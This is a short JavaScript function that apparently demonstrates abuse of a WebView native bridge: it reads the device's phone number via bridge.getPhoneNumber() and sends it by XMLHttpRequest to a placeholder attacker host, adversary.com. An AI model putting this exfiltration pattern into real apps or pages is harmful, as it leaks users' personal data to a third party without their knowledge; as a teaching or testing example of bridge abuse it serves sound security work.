function foo(){
	var phoneNumber = bridge.getPhoneNumber();
//	document.getElementById("msg").innerText = document.getElementById("msg").innerText + phoneNumber; 
	var xhr = new XMLHttpRequest();
	xhr.open("GET","http://adversary.com/malicious");
	xhr.send(phoneNumber);
}